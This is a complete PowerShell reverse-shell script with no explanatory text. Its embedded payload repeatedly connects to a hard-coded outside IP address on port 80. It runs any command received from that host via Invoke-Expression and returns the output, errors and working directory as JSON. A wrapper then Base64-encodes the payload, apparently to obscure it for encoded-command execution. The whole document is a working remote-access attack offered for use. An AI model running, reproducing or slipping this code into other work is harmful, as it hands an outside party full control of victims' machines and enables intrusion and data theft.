$MyScript = @'
$daip = "194.195.244.202";
$daport = 80;
$enc = [Text.Encoding]::UTF8

while ($True) {
    while ($True) {
        try {
            $client = New-Object System.Net.Sockets.TCPClient($daip, $daport);
            break
        }
        catch {
            Write-Warning $Error[0]
            continue
        }
        
    }
    
    $stream = $client.GetStream(); 
    [byte[]]$bytes = 0..65535 | ForEach-Object { 0 };
    
    try {
        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
            try {
                $cmdOutput = Invoke-Expression $data -ErrorVariable errorv -ErrorAction SilentlyContinue | Out-String;
            }
            catch {
        
            }
            $path = Get-Location;
            $path = $path.Path | Out-String;
            
            if (!$errorv) {
                $table = @{ status = "OK"; out = $cmdOutput; path = $path }
            }
            else {
                $table = @{ status = "ERR"; out = $errorv | Out-String; path = $path }
            }

        
        
            $jsonTable = ConvertTo-Json $table | Out-String;
            $jsonTable += "   ThisIsTheEndOfTheJsonTable   69 Lol";
            $bytesend = $enc.GetBytes($jsonTable)
            $stream.Write($bytesend, 0, $bytesend.Length);
            $stream.Flush();
        
        };
    }
    catch {
        continue;
    }
    $client.Close();
        
}
'@

$MyEncodedScript = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($MyScript))
Write-Output $MyEncodedScript